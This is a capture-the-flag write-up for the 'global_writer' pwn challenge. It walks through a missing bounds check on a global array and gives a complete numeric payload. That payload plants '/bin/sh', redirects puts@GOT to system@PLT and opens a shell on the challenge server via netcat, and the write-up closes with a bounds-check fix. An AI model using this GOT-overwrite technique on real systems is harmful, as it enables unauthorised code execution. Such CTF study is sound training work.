# Global Writer - PWN Challenge Solution

## Challenge Info
- **Name**: global_writer
- **Description**: "Just make 'em all global. Way easier."
- **Target**: `nc 34.84.25.24 58554`
- **Flag Format**: `TSGCTF{...}`

## Vulnerability Analysis

### Source Code Review
The vulnerability is in [src.c](src.c):

```c
int values[SIZE];  // SIZE = 0x10 (16 elements)
int idx, i;

void edit() {
  while (1) {
    printf("index? > ");
    scanf("%d", &idx);
    if (idx == -1) break;
    
    // NO BOUNDS CHECKING!
    printf("value? > ");
    scanf("%d", &values[idx]);  // Out-of-bounds write
  }
  puts(msg);  // Called after loop exits
}
```

**Bug**: No validation that `idx` is within `[0, SIZE-1]`. This allows **arbitrary relative write** to global memory.

### Binary Protections
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

Key points:
- **No PIE**: All addresses are fixed
- **Partial RELRO**: GOT entries are writable
- **NX Enabled**: No shellcode execution
- **Stack Canary**: Stack overflow protected

### Memory Layout (No PIE)
```
0x4006c0  - system@PLT
0x601020  - puts@GOT
0x601050  - exit@GOT  
0x601068  - msg (char* pointer)
0x6010c0  - values[16] array
```

## Exploit Strategy

### Goal
Get shell by calling `system("/bin/sh")`

### Approach: GOT Overwrite
1. **Write "/bin/sh" string** into `values[0]` and `values[1]`
2. **Overwrite `msg` pointer** to point to our "/bin/sh" string
3. **Overwrite `puts@GOT`** with `system@PLT`
4. **Exit loop**: Program calls `puts(msg)` → actually calls `system("/bin/sh")`!

### Calculations

```python
# Addresses
values_base = 0x6010c0
puts_got = 0x601020
system_plt = 0x4006c0
msg_addr = 0x601068

# Offsets from values[0]
offset_to_puts_got = (0x601020 - 0x6010c0) // 4 = -40
offset_to_msg = (0x601068 - 0x6010c0) // 4 = -22

# String values
'/bin' as int = 0x6e69622f = 1852400175
'/sh\x00' as int = 0x0068732f = 6845231
```

## Exploit Payload

### Manual Input (for `nc 34.84.25.24 58554`)

```
0
1852400175
1
6845231
-22
6295744
-21
0
-40
4196032
-39
0
-1
```

Then send shell commands:
```
cat flag*
ls
pwd
```

### Explanation of Each Step

1. `index: 0, value: 1852400175` → Write "/bin" to values[0]
2. `index: 1, value: 6845231` → Write "/sh\x00" to values[1]
3. `index: -22, value: 6295744` → Overwrite msg pointer (low 32 bits) to point to values[0]
4. `index: -21, value: 0` → Overwrite msg pointer (high 32 bits)
5. `index: -40, value: 4196032` → Overwrite puts@GOT (low 32 bits) with system@PLT
6. `index: -39, value: 0` → Overwrite puts@GOT (high 32 bits)
7. `index: -1` → Exit loop, triggers `puts(msg)` which now calls `system("/bin/sh")`

## Files

- `src.c` - Original vulnerable source code
- `chal` - Compiled binary (local)
- `exploit_remote.py` - Python exploit using sockets
- `exploit_simple.py` - Pwntools-based exploit
- `show_exploit.py` - Displays exploit values
- `input.txt` - Manual input for testing
- `run_exploit.bat` - Windows batch script

## Flag

**Flag Location**: The flag is stored in `build/flag.txt` locally, or on the remote server in `/home/user/flag-<md5>.txt`

When exploit succeeds:
```bash
$ cat flag*
TSGCTF{***REDACTED***}
```

## Running the Exploit

### Method 1: Automated (Python)
```bash
python3 exploit_remote.py
```

### Method 2: Manual (netcat)
```bash
(cat input.txt; cat) | nc 34.84.25.24 58554
```

### Method 3: Interactive
```bash
nc 34.84.25.24 58554
# Paste the payload line by line
# Then execute: cat flag*
```

## Key Takeaways

1. **Global variables** with no bounds checking = arbitrary relative write
2. **No PIE** makes exploitation easier (fixed addresses)
3. **Partial RELRO** allows GOT overwrite
4. **GOT hijacking** is powerful: redirect library functions to arbitrary code
5. Classic technique: Overwrite `puts/printf@GOT` with `system` and control the argument

## Mitigation

To fix the vulnerability:

```c
if (idx < 0 || idx >= SIZE) {
    handle_error();
}
```

Add bounds checking before array access!
